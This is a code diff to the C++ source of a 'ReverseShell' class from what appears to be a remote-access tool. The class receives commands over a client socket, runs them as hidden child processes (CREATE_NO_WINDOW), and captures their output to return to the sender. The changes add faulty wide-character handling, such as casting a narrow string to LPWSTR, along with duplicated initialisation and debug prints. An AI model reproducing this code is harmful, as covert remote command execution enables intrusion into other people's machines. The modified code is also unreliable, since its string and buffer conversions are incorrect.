@@ -37,31 +37,32 @@ int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOu
                               0)) { return 1; } // Ensure the read handle to the pipe for STDOUT is not inherited
 
     PROCESS_INFORMATION piProcInfo;
-    STARTUPINFO siStartInfo;
-
+    STARTUPINFOW siStartInfo;
     // Set up members of the PROCESS_INFORMATION structure.
     ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
 
     // Set up members of the STARTUPINFO structure.
     // This structure specifies the STDERR and STDOUT handles for redirection.
     ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
-    siStartInfo.cb = sizeof(STARTUPINFO);
+
+    ZeroMemory(&siStartInfo, sizeof(STARTUPINFOW));  // Aquí también
+    siStartInfo.cb = sizeof(STARTUPINFOW);  // Y aquí
     siStartInfo.hStdError = g_hChildStd_ERR_Wr;
     siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
     siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
     // Create the child process.
-    CreateProcessA(
-            nullptr,             // program name
-            (LPSTR)commandToExecute.c_str(),       // command line
-            nullptr,             // process security attributes
-            nullptr,             // primary thread security attributes
-            TRUE,             // handles are inherited
-            CREATE_NO_WINDOW, // creation flags (this is what hides the window)
-            nullptr,             // use parent's environment
-            nullptr,             // use parent's current directory
-            static_cast<LPSTARTUPINFOA>((&siStartInfo)),     // STARTUPINFO pointer
-            &piProcInfo       // receives PROCESS_INFORMATION
+    CreateProcessW(
+            nullptr,
+            (LPWSTR)commandToExecute.c_str(),
+            nullptr,
+            nullptr,
+            TRUE,
+            CREATE_NO_WINDOW,
+            nullptr,
+            nullptr,
+            &siStartInfo,
+            &piProcInfo
     );
 
     CloseHandle(g_hChildStd_ERR_Wr);
@@ -70,15 +71,18 @@ int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOu
     // read output
 #define BUFSIZE 4096
     DWORD dwRead;
-    CHAR chBuf[BUFSIZE];
-    bool bSuccess2 = FALSE;
-    for (;;) { // read stdout
-        bSuccess2 = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, nullptr);
-        if (!bSuccess2 || dwRead == 0) break;
-        std::string s(chBuf, dwRead);
-        outOutput += s;
+    WCHAR chBuf[BUFSIZE];
+    bool bSuccess = FALSE;
+    for (;;) {
+        bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, nullptr);
+        if (!bSuccess || dwRead == 0) break;
+
+        std::wstring s(chBuf, dwRead);
+        std::wcout << s << std::endl;
+        //outOutput += s;
     }
     dwRead = 0;
+    std::cout << "To execute: "  << commandToExecute <<  "Output "<< outOutput << std::endl;
 
 
     // The remaining open handles are cleaned up when this process terminates.
@@ -87,8 +91,9 @@ int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOu
     return 0;
 }
 
-ReverseShell::ReverseShell(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap) : Sender(stream, actionMap){
-    actionMap["EXECUTE_COMMAND"]  = [&](nlohmann::json& json) {
+ReverseShell::ReverseShell(ClientSocket &clientSocket) : Handler(clientSocket){
+    ActionMap& actionMap = clientSocket.getActionMap();
+    actionMap["REVERSE_SHELL_COMMAND"]  = [&](nlohmann::json& json) {
         threadGen.runInNewThread(this, &ReverseShell::executeCommandAndSendResult, json);
     };
 }
@@ -96,9 +101,5 @@ ReverseShell::ReverseShell(const Stream &stream, std::unordered_map<std::string,
 void ReverseShell::executeCommandAndSendResult(nlohmann::json jsonObject){
     std::string command = jsonObject["command"];
     std::string resultOfCommand = executeCommand(Converter::string2wstring(command));
-    stream.sendString(resultOfCommand.c_str());
-}
-
-void ReverseShell::send() {
-
+    //stream.sendString(resultOfCommand.c_str());
 }
